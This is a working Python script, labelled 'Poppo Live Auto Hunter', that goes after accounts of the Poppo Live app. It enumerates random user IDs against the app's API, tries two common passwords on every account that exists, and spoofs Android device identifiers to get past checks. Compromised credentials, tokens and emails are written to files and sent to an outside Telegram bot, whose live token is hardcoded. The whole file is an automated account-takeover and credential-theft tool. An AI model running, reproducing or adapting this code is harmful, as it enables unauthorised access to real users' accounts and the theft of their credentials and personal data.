#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Poppo Live - Auto Hunter + Checker + Telegram Reporter
Non-interactive version (works in Codespaces / no TTY)
"""
import os, sys, json, time, random, threading
import requests, urllib3, warnings
from datetime import datetime
from queue import Queue
from collections import deque
from colorama import Fore, Style, init

init(autoreset=True)
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

# ═══════════════════════════════════════════════════════════════
# الإعدادات
# ═══════════════════════════════════════════════════════════════
THREADS         = 20
TARGET_COUNT    = 1_000_000_000
ID_MIN          = 10_000_000
ID_MAX          = 99_999_999
REQUEST_TIMEOUT = 20
MAX_RETRIES     = 2
REPORT_INTERVAL = 600
PRINT_INTERVAL  = 30

PASSWORDS = ["Aa123456", "Aa123456789"]

DEVICE = {
    "smei_id":     "BBwEAY8YRFs04yeeIrPSprq/BLNjA8h3FLJUfkBGrYJgaNXhnUitq++B41rYnAS3fbOOdMnT6n6KUCCXp6noXcg==",
    "yidun_id":    "FzZxOxNTF1lTok0lVJs2wXK+JAuSe4RR8Yz7U++kZUZH34d6ZMPSnoKCtIUmD5gzCegGvg==",
    "uuid":        "2c90bd96a205f6c9",
    "device_name": "samsung SM-A155F",
    "user_agent":  "Dalvik/2.1.0 (Linux; U; Android 14; SM-A155F Build/UP1A.231005.007)",
    "c": "poppo", "v": "550", "vs": "5.4.550.0917",
    "sl": "en", "l": "en", "mcc": "60301", "p": "android",
    "x_request_agent": "0ffffffdb0ffffff843f0fffffff17a0ffffffb07b140e1d11300ffffffcb0ffffff800f14",
    "install_time": "2026-11-05 10:00:00.000",
}

TG_TOKEN   = "8947371808:AAH7k_kTGFMfbRU_pqhiqgI8lCr6gBERQNg"
TG_CHAT_ID = "7236237385"

# ═══════════════════════════════════════════════════════════════
class Stats:
    def __init__(self):
        self.checked = 0
        self.exists = 0
        self.not_exists = 0
        self.login_tried = 0
        self.hits = 0
        self.bad_login = 0
        self.errors = 0
        self.start_time = time.time()
        self._lock = threading.Lock()

    def inc(self, name, n=1):
        with self._lock:
            setattr(self, name, getattr(self, name) + n)

    def snapshot(self):
        with self._lock:
            return {
                "checked": self.checked, "exists": self.exists,
                "not_exists": self.not_exists, "login_tried": self.login_tried,
                "hits": self.hits, "bad_login": self.bad_login,
                "errors": self.errors,
                "elapsed": int(time.time() - self.start_time),
            }

    def cpm(self):
        e = time.time() - self.start_time
        return int((self.checked / e) * 60) if e > 0 else 0

stats = Stats()
lock = threading.Lock()
inflight = {}
recent = deque(maxlen=20)
new_hits_buffer = []
new_hits_lock = threading.Lock()

def create_results_folder():
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    f = f"results/poppo_{ts}"
    os.makedirs(f, exist_ok=True)
    return f

RESULTS_FOLDER = create_results_folder()

def save_line(fn, content):
    try:
        with open(os.path.join(RESULTS_FOLDER, fn), "a", encoding="utf-8") as f:
            f.write(content + "\n")
    except Exception:
        pass

# ═══════════════════════════════════════════════════════════════
# تيليجرام
# ═══════════════════════════════════════════════════════════════
def tg_send(text):
    try:
        url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
        requests.post(url, json={
            "chat_id": TG_CHAT_ID, "text": text,
            "parse_mode": "HTML", "disable_web_page_preview": True,
        }, timeout=15)
    except Exception as e:
        print(f"[TG] {e}")

def reporter_thread():
    while True:
        time.sleep(REPORT_INTERVAL)
        snap = stats.snapshot()
        with new_hits_lock:
            batch = list(new_hits_buffer)
            new_hits_buffer.clear()

        h, m, s = snap["elapsed"] // 3600, (snap["elapsed"] % 3600) // 60, snap["elapsed"] % 60
        report = (
            f"📊 <b>Poppo Report</b>\n"
            f"⏱ {h}h {m}m {s}s\n"
            f"🔍 Checked: <b>{snap['checked']:,}</b>\n"
            f"✅ IDs Found: <b>{snap['exists']:,}</b>\n"
            f"🔑 Logins: {snap['login_tried']:,}\n"
            f"🎯 <b>HITS: {snap['hits']:,}</b>\n"
            f"🚫 Bad: {snap['bad_login']:,}  ⚠️ Err: {snap['errors']:,}\n"
            f"⚡ CPM: {stats.cpm():,}\n"
        )
        if batch:
            report += f"\n🆕 <b>New Hits ({len(batch)}):</b>\n"
            for hit in batch[:10]:
                report += f"• <code>{hit['userid']}:{hit['password']}</code> {hit.get('nickname','')}\n"
            if len(batch) > 10:
                report += f"... +{len(batch)-10}\n"
        tg_send(report)

# ═══════════════════════════════════════════════════════════════
# الفحص
# ═══════════════════════════════════════════════════════════════
def check_userid(session, userid):
    params = {
        "userid": str(userid), "p": DEVICE["p"],
        "smei_id": DEVICE["smei_id"], "device_name": DEVICE["device_name"],
        "c": DEVICE["c"], "v": DEVICE["v"], "yidun_id": DEVICE["yidun_id"],
        "sl": DEVICE["sl"], "l": DEVICE["l"], "mcc": DEVICE["mcc"],
        "vs": DEVICE["vs"], "uuid": DEVICE["uuid"],
        "_mtime": str(int(time.time() * 1000)),
    }
    headers = {
        "Content-Type": "application/json; charset=utf-8",
        "User-Agent": DEVICE["user_agent"], "Accept-Encoding": "gzip",
    }
    for attempt in range(MAX_RETRIES):
        try:
            r = session.get("https://api.vshowapi.com/user/check-userid",
                            params=params, headers=headers,
                            timeout=REQUEST_TIMEOUT, verify=False)
            if r.status_code == 429:
                time.sleep(2); continue
            data = r.json()
            if data.get("status") != "ok":
                return None, {}
            d = data.get("data", {})
            return str(d.get("exists", "0")) == "1", d
        except Exception:
            if attempt == MAX_RETRIES - 1:
                return None, {}
            time.sleep(0.5)
    return None, {}

def try_login(session, userid, password):
    params = {
        "login_type": "password", "password": password, "inland": "0",
        "type": "userid", "userid": str(userid), "p": DEVICE["p"],
        "smei_id": DEVICE["smei_id"], "device_name": DEVICE["device_name"],
        "c": DEVICE["c"], "v": DEVICE["v"], "yidun_id": DEVICE["yidun_id"],
        "sl": DEVICE["sl"], "l": DEVICE["l"], "mcc": DEVICE["mcc"],
        "vs": DEVICE["vs"], "uuid": DEVICE["uuid"],
    }
    body = {
        "login_type": "password", "password": password, "inland": "0",
        "type": "userid", "userid": str(userid),
        "install_data": json.dumps({
            "install_time": DEVICE["install_time"],
            "af_message": "organic install", "af_status": "Organic",
            "is_first_launch": False,
        }, separators=(",", ":")),
        "p": DEVICE["p"], "smei_id": DEVICE["smei_id"],
        "device_name": DEVICE["device_name"], "c": DEVICE["c"],
        "v": DEVICE["v"], "yidun_id": DEVICE["yidun_id"],
        "sl": DEVICE["sl"], "l": DEVICE["l"], "mcc": DEVICE["mcc"],
        "vs": DEVICE["vs"], "uuid": DEVICE["uuid"],
    }
    headers = {
        "X-Request-Agent": DEVICE["x_request_agent"],
        "X-Request-Device-Id": DEVICE["smei_id"],
        "x-device-info": json.dumps({
            "smei_id": DEVICE["smei_id"], "android_id": DEVICE["uuid"],
            "oaid": "", "device_name": DEVICE["device_name"], "imei": "",
        }, separators=(",", ":")),
        "X-Request-Time": str(int(time.time())),
        "User-Agent": DEVICE["user_agent"],
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip",
    }
    for attempt in range(MAX_RETRIES):
        try:
            r = session.post("https://api.vshowapi.com/user/login",
                             params=params, data=body, headers=headers,
                             timeout=REQUEST_TIMEOUT, verify=False,
                             allow_redirects=True)
            if r.status_code == 429:
                time.sleep(2); continue
            data = r.json()
            if (data.get("status") or "").lower() == "ok" and data.get("token"):
                return "hit", data
            return "bad", data
        except Exception:
            if attempt == MAX_RETRIES - 1:
                return "error", {}
            time.sleep(0.5)
    return "error", {}

# ═══════════════════════════════════════════════════════════════
# معالجة ID
# ═══════════════════════════════════════════════════════════════
def process_id(userid):
    with lock:
        inflight[userid] = time.time()
    result = {"userid": userid, "exists": None, "email": "",
              "has_pwd": "0", "login": "skipped", "nickname": ""}
    try:
        session = requests.Session()
        session.verify = False
        session.trust_env = False
        session.headers.update({"User-Agent": DEVICE["user_agent"]})

        exists, data = check_userid(session, userid)
        result["exists"] = exists

        if exists is None:
            result["login"] = "error"; stats.inc("errors")
        elif not exists:
            stats.inc("not_exists")
        else:
            stats.inc("exists")
            result["email"] = data.get("email", "") or ""
            result["has_pwd"] = str(data.get("has_passwd", "0"))
            save_line("Found_IDs.txt",
                      f"{userid}\t{result['email']}\tpwd={result['has_pwd']}")

            if result["has_pwd"] == "1":
                for pwd in PASSWORDS:
                    stats.inc("login_tried")
                    status, login_data = try_login(session, userid, pwd)

                    if status == "hit":
                        stats.inc("hits")
                        result["login"] = "hit"
                        result["nickname"] = login_data.get("nickname", "")
                        save_line("Hits.txt", f"{userid}:{pwd}")
                        save_line("Hits_Details.txt", json.dumps({
                            "userid": userid, "password": pwd,
                            "uid": login_data.get("uid"),
                            "nickname": result["nickname"],
                            "email": login_data.get("email"),
                            "token": login_data.get("token"),
                            "public_key": login_data.get("public_key"),
                        }, ensure_ascii=False))
                        with new_hits_lock:
                            new_hits_buffer.append({
                                "userid": userid, "password": pwd,
                                "nickname": result["nickname"],
                            })
                        break
                    elif status == "bad":
                        stats.inc("bad_login")
                        result["login"] = "bad"
                    else:
                        stats.inc("errors")
                        result["login"] = "error"
            else:
                result["login"] = "no_pwd"
    except Exception:
        stats.inc("errors"); result["login"] = "error"
    finally:
        with lock:
            inflight.pop(userid, None)
            recent.append(result)
            stats.inc("checked")

# ═══════════════════════════════════════════════════════════════
# المولد والعمال
# ═══════════════════════════════════════════════════════════════
def id_generator(queue, target_count, stop_event, done_event):
    seen = set(); generated = 0
    while generated < target_count and not stop_event.is_set():
        uid = random.randint(ID_MIN, ID_MAX)
        if uid in seen:
            continue
        seen.add(uid); generated += 1
        queue.put(uid)
    done_event.set()

def worker(queue, stop_event, done_event):
    while not stop_event.is_set():
        try:
            uid = queue.get(timeout=0.5)
        except Exception:
            if done_event.is_set() and queue.empty():
                break
            continue
        try:
            process_id(uid)
        finally:
            queue.task_done()

# ═══════════════════════════════════════════════════════════════
# طابع الإحصائيات كل 30 ثانية
# ═══════════════════════════════════════════════════════════════
def printer_thread():
    while True:
        time.sleep(PRINT_INTERVAL)
        s = stats.snapshot()
        h, m, sec = s["elapsed"] // 3600, (s["elapsed"] % 3600) // 60, s["elapsed"] % 60
        print(
            f"\n[{h:02d}:{m:02d}:{sec:02d}] "
            f"Checked={s['checked']:,} | IDs={s['exists']:,} | "
            f"Logins={s['login_tried']:,} | HITS={s['hits']:,} | "
            f"Bad={s['bad_login']:,} | Err={s['errors']:,} | "
            f"CPM={stats.cpm():,} | InFlight={len(inflight)}",
            flush=True,
        )

# ═══════════════════════════════════════════════════════════════
# Main
# ═══════════════════════════════════════════════════════════════
def main():
    print("═" * 60)
    print("   Poppo Live — Auto Hunter (Non-Interactive)")
    print("═" * 60)
    print(f"   Threads     : {THREADS}")
    print(f"   Target      : {TARGET_COUNT:,} IDs")
    print(f"   Passwords   : {', '.join(PASSWORDS)}")
    print(f"   Report      : Every 10 minutes to Telegram")
    print(f"   Results     : {RESULTS_FOLDER}")
    print("═" * 60)
    print("Starting...\n", flush=True)

    tg_send(
        f"🚀 <b>Poppo Hunter Started</b>\n"
        f"Threads: {THREADS}\n"
        f"Passwords: {', '.join(PASSWORDS)}\n"
        f"Reports every 10 min."
    )

    # خيوط المساعدة
    threading.Thread(target=reporter_thread, daemon=True).start()
    threading.Thread(target=printer_thread, daemon=True).start()

    queue = Queue(maxsize=THREADS * 8)
    stop_event = threading.Event()
    done_event = threading.Event()

    threading.Thread(target=id_generator,
                     args=(queue, TARGET_COUNT, stop_event, done_event),
                     daemon=True).start()

    for _ in range(THREADS):
        threading.Thread(target=worker,
                         args=(queue, stop_event, done_event),
                         daemon=True).start()

    # انتظر لا نهائي (حتى Ctrl+C)
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        stop_event.set()

    s = stats.snapshot()
    print(f"\nDone. Saved to: {RESULTS_FOLDER}")
    print(f"Checked: {s['checked']:,} | IDs: {s['exists']:,} | "
          f"Logins: {s['login_tried']:,} | HITS: {s['hits']:,} | "
          f"Bad: {s['bad_login']:,} | Err: {s['errors']:,}")

if __name__ == "__main__":
    main()